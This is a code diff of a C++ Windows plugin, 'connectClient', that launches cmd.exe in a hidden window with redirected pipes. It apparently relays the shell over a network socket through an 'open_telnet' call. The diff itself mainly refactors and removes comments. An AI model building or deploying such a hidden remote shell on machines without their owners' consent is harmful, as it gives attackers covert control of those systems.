@@ -4,10 +4,10 @@
 class connectClient : public PluginNamespace::pluginBase
 {
 public:
-      bool runFun(PluginNamespace::PluginInfo &info) override
+      bool runFun(PluginNamespace::Info &info) override
       {
-            auto pluginInfo = std::static_pointer_cast<PluginInfoStruct>(info.cus->data[0]);
-            return (open_telnet(*info.mainConnectSocket) == SUCCESS_STATUS);
+            std::shared_ptr<programPluginInfoStruct> &funInfo = (std::shared_ptr<programPluginInfoStruct> &)(info.customize_data[0]);
+            return (open_telnet(*(funInfo->mainConnectSocket)) == SUCCESS_STATUS);
       }
       connectClient()
       {
@@ -32,15 +32,14 @@ private:
             sa.nLength = sizeof(sa);
             sa.bInheritHandle = TRUE;
             sa.lpSecurityDescriptor = NULL;
-            // 创建标准输入/输出管道
+
             if (!CreatePipe(&outputRead, &outputWrite, &sa, 0) || !CreatePipe(&inputRead, &inputWrite, &sa, 0))
                   return GetLastError();
-            // 分配内存资源，初始化数据
+
             ZeroMemory(&Processinfo, sizeof(PROCESS_INFORMATION));
             ZeroMemory(&Startupinfo, sizeof(STARTUPINFO));
             GetEnvironmentVariable("COMSPEC", szCMDPath, sizeof(szCMDPath));
 
-            // 设置启动信息
             Startupinfo.cb = sizeof(STARTUPINFO);
             Startupinfo.wShowWindow = SW_HIDE;
             Startupinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
@@ -79,7 +78,6 @@ private:
                   return GetLastError();
             }
 
-            // 关闭进程句柄
             CloseHandle(Processinfo.hProcess);
             CloseHandle(Processinfo.hThread);
             return SUCCESS_STATUS;
@@ -95,7 +93,6 @@ private:
                   {
                         if (bytesAvailable > 0)
                         {
-                              // 有数据可读
                               ReadFile(outputRead, cbuf, sizeof(cbuf) - 1, &dwBytesRead, NULL);
                               res += cbuf;
                               if (dwBytesRead == 0)
@@ -109,6 +106,7 @@ private:
                   else
                         Sleep(10);
                   timeout_ms -= 10;
+
                   memset(cbuf, 0, sizeof(cbuf));
             } while (timeout_ms > 0);
 
